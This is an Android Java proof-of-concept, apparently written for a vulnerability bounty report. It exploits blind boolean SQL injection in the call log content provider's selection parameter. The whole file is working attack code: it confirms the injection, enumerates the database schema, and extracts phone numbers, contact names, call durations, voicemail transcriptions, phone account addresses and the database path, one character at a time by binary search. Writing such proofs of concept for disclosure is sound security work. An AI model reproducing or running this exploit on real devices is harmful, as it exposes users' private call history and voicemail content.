package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class CallLogSqliActivity extends Activity {
    private static final String TAG = "CallLogSQLi";
    private static final Uri URI = Uri.parse("content://call_log/calls");
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(8);
        logView.setText("CallLogProvider Blind SQLi PoC\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private int qc(String sel) {
        try {
            Cursor c = getContentResolver().query(URI, new String[]{"_id"}, sel, null, null);
            if (c != null) { int n = c.getCount(); c.close(); return n; }
        } catch (Exception e) { return -1; }
        return -1;
    }

    private void runTests() {
        log("=== STEP 1: Verify blind boolean SQLi ===");
        int baseline = qc(null);
        log("Baseline call log entries: " + baseline);
        if (baseline <= 0) {
            log("[WARN] No call log entries - need at least 1 for blind extraction");
            log("Testing with explicit true/false...");
        }
        int t = qc("1=1 AND (SELECT 1) = 1");
        int f = qc("1=1 AND (SELECT 1) = 99");
        log("Subquery true=" + t + " false=" + f);
        if (t > 0 && f == 0) {
            log("[CONFIRMED] CallLogProvider blind boolean SQLi works!");
        } else if (t == -1 || f == -1) {
            log("[BLOCKED] Subqueries blocked from app context");
            log("Testing CASE injection instead...");
            int ct = qc("CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END = 1");
            int cf = qc("CASE WHEN (SELECT 1)=0 THEN 1 ELSE 0 END = 1");
            log("CASE true=" + ct + " false=" + cf);
            if (ct > 0 && cf == 0) {
                log("[CONFIRMED] CASE injection works!");
            }
            log("\n=== ALL TESTS COMPLETE ===");
            return;
        }

        log("\n=== STEP 2: Database schema ===");
        int tableCount = en("(SELECT count(*) FROM sqlite_master WHERE type='table')");
        log("Tables: " + tableCount);
        for (int i = 0; i < tableCount; i++) {
            String name = es("(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET " + i + ")", 40);
            int rows = en("(SELECT count(*) FROM " + name + ")");
            log("Table[" + i + "]: " + name + " (" + rows + " rows)");
        }

        log("\n=== STEP 3: Extract call log data ===");
        int callCount = en("(SELECT count(*) FROM calls)");
        log("Total calls: " + callCount);
        for (int i = 0; i < Math.min(callCount, 5); i++) {
            String number = es("(SELECT number FROM calls LIMIT 1 OFFSET " + i + ")", 20);
            String name = es("(SELECT name FROM calls LIMIT 1 OFFSET " + i + ")", 30);
            int type = en("(SELECT type FROM calls LIMIT 1 OFFSET " + i + ")");
            int duration = en("(SELECT duration FROM calls LIMIT 1 OFFSET " + i + ")");
            String typeStr = type == 1 ? "INCOMING" : type == 2 ? "OUTGOING" : type == 3 ? "MISSED" : "TYPE_" + type;
            log("Call[" + i + "]: " + number + " (" + name + ") " + typeStr + " dur=" + duration + "s");
        }

        log("\n=== STEP 4: Extract voicemail data ===");
        int vmCount = en("(SELECT count(*) FROM calls WHERE type=4)");
        log("Voicemail entries: " + vmCount);
        for (int i = 0; i < Math.min(vmCount, 3); i++) {
            String trans = es("(SELECT transcription FROM calls WHERE type=4 LIMIT 1 OFFSET " + i + ")", 80);
            log("VM transcription[" + i + "]: " + trans);
        }

        log("\n=== STEP 5: Extract phone accounts ===");
        for (int i = 0; i < Math.min(callCount, 3); i++) {
            String acctAddr = es("(SELECT phone_account_address FROM calls LIMIT 1 OFFSET " + i + ")", 30);
            String subsId = es("(SELECT subscription_id FROM calls LIMIT 1 OFFSET " + i + ")", 20);
            log("PhoneAcct[" + i + "]: addr=" + acctAddr + " sub=" + subsId);
        }

        log("\n=== STEP 6: SQLite version + DB path ===");
        String sqlVer = es("(SELECT sqlite_version())", 20);
        String dbPath = es("(SELECT file FROM pragma_database_list LIMIT 1)", 120);
        log("SQLite: " + sqlVer);
        log("DB path: " + dbPath);

        log("\n=== STEP 7: Check for additional tables ===");
        int viewCount = en("(SELECT count(*) FROM sqlite_master WHERE type='view')");
        int triggerCount = en("(SELECT count(*) FROM sqlite_master WHERE type='trigger')");
        log("Views: " + viewCount + " Triggers: " + triggerCount);

        log("\n=== ALL TESTS COMPLETE ===");
    }

    private int en(String sub) {
        int lo = 0, hi = 100;
        while (qc("1=1 AND " + sub + " > " + hi) > 0) { hi *= 2; if (hi > 100000) return -1; }
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int r = qc("1=1 AND " + sub + " > " + mid);
            if (r > 0) lo = mid + 1; else if (r == 0) hi = mid; else return -1;
        }
        return lo;
    }

    private String es(String sub, int maxLen) {
        StringBuilder result = new StringBuilder();
        for (int pos = 1; pos <= maxLen; pos++) {
            int ch = ec(sub, pos);
            if (ch <= 0) break;
            result.append((char) ch);
        }
        return result.toString();
    }

    private int ec(String sub, int pos) {
        if (qc("1=1 AND length(" + sub + ") >= " + pos) <= 0) return -1;
        String expr = "(SELECT unicode(substr(" + sub + "," + pos + ",1)))";
        int lo = 0, hi = 127;
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int r = qc("1=1 AND " + expr + " > " + mid);
            if (r > 0) lo = mid + 1; else if (r == 0) hi = mid; else return -1;
        }
        return lo;
    }
}
